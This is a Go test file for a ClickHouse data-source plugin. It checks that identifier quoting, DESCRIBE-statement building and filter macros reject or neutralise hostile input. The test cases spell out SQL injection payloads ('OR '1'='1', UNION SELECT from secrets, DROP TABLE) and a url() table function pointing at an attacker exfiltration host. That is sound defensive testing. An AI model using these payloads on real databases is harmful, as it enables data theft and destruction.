package plugin

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/grafana/grafana-plugin-sdk-go/backend"
	"github.com/hydrolix/clickhouse-sql-parser/parser"
	"github.com/hydrolix/plugin/pkg/plugin/cte"
	"github.com/hydrolix/plugin/pkg/plugin/models"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// rawSQLOf extracts the rawSql the provider marshalled into the synthetic
// request, so tests can assert on the exact SQL sent upstream.
func rawSQLOf(t *testing.T, req *backend.QueryDataRequest) string {
	t.Helper()
	require.NotNil(t, req)
	require.Len(t, req.Queries, 1)
	var m map[string]any
	require.NoError(t, json.Unmarshal(req.Queries[0].JSON, &m))
	s, _ := m["rawSql"].(string)
	return s
}

func TestQuoteIdentifier(t *testing.T) {
	t.Run("wraps a plain identifier", func(t *testing.T) {
		q, err := quoteIdentifier("events")
		require.NoError(t, err)
		assert.Equal(t, "`events`", q)
	})

	t.Run("round-trips quotes, backslashes, spaces, dots, and UTF-8", func(t *testing.T) {
		for _, name := range []string{"a'b", `a\b`, "hello world", "weird.name", "héllo"} {
			q, err := quoteIdentifier(name)
			require.NoError(t, err, "quoteIdentifier(%q)", name)
			stmts, err := parser.NewParser("SELECT 1 FROM " + q).ParseStmts()
			require.NoError(t, err, "quoted %q must parse", name)
			sel := stmts[0].(*parser.SelectQuery)
			jte := sel.From.Expr.(*parser.JoinTableExpr)
			ti := jte.Table.Expr.(*parser.TableIdentifier)
			assert.Equal(t, name, ti.Table.Name, "quoted %q must recover the original name", name)
		}
	})

	t.Run("rejects an embedded backtick", func(t *testing.T) {
		_, err := quoteIdentifier("a`b")
		assert.Error(t, err)
	})

	t.Run("rejects NUL", func(t *testing.T) {
		_, err := quoteIdentifier("a\x00b")
		assert.Error(t, err)
	})
}

func TestBuildDescribeSQL(t *testing.T) {
	t.Run("plain table becomes a quoted DESCRIBE", func(t *testing.T) {
		sql, err := buildDescribeSQL("events")
		require.NoError(t, err)
		assert.Equal(t, "DESCRIBE TABLE `events`", sql)
	})

	t.Run("database.table is fully quoted", func(t *testing.T) {
		sql, err := buildDescribeSQL("mydb.events")
		require.NoError(t, err)
		assert.Equal(t, "DESCRIBE TABLE `mydb`.`events`", sql)
	})

	t.Run("source backticks are normalised, not passed through", func(t *testing.T) {
		sql, err := buildDescribeSQL("`mydb`.`events`")
		require.NoError(t, err)
		assert.Equal(t, "DESCRIBE TABLE `mydb`.`events`", sql)
	})

	t.Run("subquery wraps and re-parses to a single DESCRIBE", func(t *testing.T) {
		sql, err := buildDescribeSQL("(SELECT a, b FROM events)")
		require.NoError(t, err)
		assert.True(t, strings.HasPrefix(sql, "DESCRIBE ("), "got %q", sql)
		stmts, err := parser.NewParser(sql).ParseStmts()
		require.NoError(t, err)
		require.Len(t, stmts, 1)
		_, ok := stmts[0].(*parser.DescribeStmt)
		assert.True(t, ok, "assembled statement must be a DESCRIBE")
	})

	t.Run("table functions are rejected", func(t *testing.T) {
		for _, tf := range []string{
			"url('http://attacker/exfil', CSV, 'c String')",
			"remote('host', db, tbl)",
			"s3('http://x', 'CSV')",
			"file('x.csv')",
			"numbers(10)",
		} {
			_, err := buildDescribeSQL(tf)
			assert.Error(t, err, "table function must be rejected: %s", tf)
		}
	})

	t.Run("trailing statement is rejected", func(t *testing.T) {
		_, err := buildDescribeSQL("t; DROP TABLE users")
		assert.Error(t, err)
	})

	t.Run("unbalanced paren cannot inject", func(t *testing.T) {
		sql, err := buildDescribeSQL("t) UNION ALL SELECT * FROM secrets --")
		if err == nil {
			assert.NotContains(t, sql, "UNION")
			assert.NotContains(t, sql, "secrets")
		}
	})

	t.Run("UNION appended to a table reduces to the base table only", func(t *testing.T) {
		sql, err := buildDescribeSQL("t UNION ALL SELECT * FROM secrets")
		require.NoError(t, err)
		assert.Equal(t, "DESCRIBE TABLE `t`", sql)
		assert.NotContains(t, sql, "UNION")
		assert.NotContains(t, sql, "secrets")
	})

	t.Run("empty expression is rejected", func(t *testing.T) {
		_, err := buildDescribeSQL("   ")
		assert.Error(t, err)
	})
}

func TestMetadataProvider_QueryPK_EscapesLiterals(t *testing.T) {
	ds := &fakeMetadataDS{
		queryDataFn: func(ctx context.Context, req *backend.QueryDataRequest) (*backend.QueryDataResponse, error) {
			return respondWith(frameOf([]string{"id"}), "pk_query"), nil
		},
	}
	p := NewMetadataProvider(ds)

	_, err := p.QueryPK(context.Background(), nil, "db", "t' OR '1'='1")
	require.NoError(t, err)

	sql := rawSQLOf(t, ds.lastRequest)
	// The injected quote survives only as an escaped byte inside the literal.
	assert.Contains(t, sql, `\'`)
	assert.NotContains(t, sql, `table ='t' OR '1'='1'`)
}

func TestMetadataProvider_QueryKeys_BuildsQuotedDescribe(t *testing.T) {
	ds := &fakeMetadataDS{
		queryDataFn: func(ctx context.Context, req *backend.QueryDataRequest) (*backend.QueryDataResponse, error) {
			return respondWith(frameOf([]string{"c"}, []string{"String"}), "key_query"), nil
		},
	}
	p := NewMetadataProvider(ds)

	_, err := p.QueryKeys(context.Background(), nil, "mydb.events")
	require.NoError(t, err)
	assert.Equal(t, "DESCRIBE TABLE `mydb`.`events`", rawSQLOf(t, ds.lastRequest))
}

func TestMetadataProvider_QueryKeys_RejectsTableFunctionBeforeQuery(t *testing.T) {
	// nopMetadataDS panics if QueryData is reached, proving rejection happens
	// before any upstream call.
	p := NewMetadataProvider(nopMetadataDS{})
	_, err := p.QueryKeys(context.Background(), nil, "url('http://attacker', CSV, 'c String')")
	assert.Error(t, err)
}

func TestAdHocFilterMacro_ExplicitArgRejectsInjection(t *testing.T) {
	p := NewMetadataProvider(nopMetadataDS{})
	q := &models.HdxQuery{
		Filters: []models.AdHocFilter{{Key: "status", Operator: "=", Value: "x"}},
	}
	_, err := AdHocFilterMacro(context.Background(), q, []string{"events) UNION SELECT 1 --"}, 0, p)
	assert.Error(t, err, "injected explicit argument must be rejected before the metadata lookup")
}

func TestAdHocFilterMacro_ExplicitArgAcceptsIdentifier(t *testing.T) {
	ds := &fakeMetadataDS{
		queryDataFn: func(ctx context.Context, req *backend.QueryDataRequest) (*backend.QueryDataResponse, error) {
			return respondWith(frameOf([]string{"status"}, []string{"String"}), "key_query"), nil
		},
	}
	p := NewMetadataProvider(ds)
	q := &models.HdxQuery{
		Filters: []models.AdHocFilter{{Key: "status", Operator: "=", Value: "x"}},
	}

	out, err := AdHocFilterMacro(context.Background(), q, []string{"events"}, 0, p)
	require.NoError(t, err)
	assert.Contains(t, out, "status")
	assert.Equal(t, 1, ds.callCount)
}

func TestBuildDescribeSQL_ResolvedWithAliasFlowsThroughShapeCheck(t *testing.T) {
	// End-to-end: a WITH-alias FROM is resolved by GetMacroCTEs to its
	// subquery, which buildDescribeSQL turns into a validated DESCRIBE.
	exprs, err := parser.NewParser("WITH x AS (SELECT a FROM events) SELECT $__adHocFilter() FROM x").ParseStmts()
	require.NoError(t, err)
	m, err := cte.GetMacroCTEs(exprs)
	require.NoError(t, err)
	require.Len(t, m, 1)

	var cteStr string
	for _, c := range m {
		cteStr = c.CTE
	}
	require.Equal(t, "(SELECT a FROM events)", cteStr)

	sql, err := buildDescribeSQL(cteStr)
	require.NoError(t, err)
	assert.Equal(t, "DESCRIBE (SELECT a FROM events)", sql)

	// The resolved subquery still passes the re-parse/shape check.
	stmts, err := parser.NewParser(sql).ParseStmts()
	require.NoError(t, err)
	require.Len(t, stmts, 1)
	_, ok := stmts[0].(*parser.DescribeStmt)
	assert.True(t, ok)
}
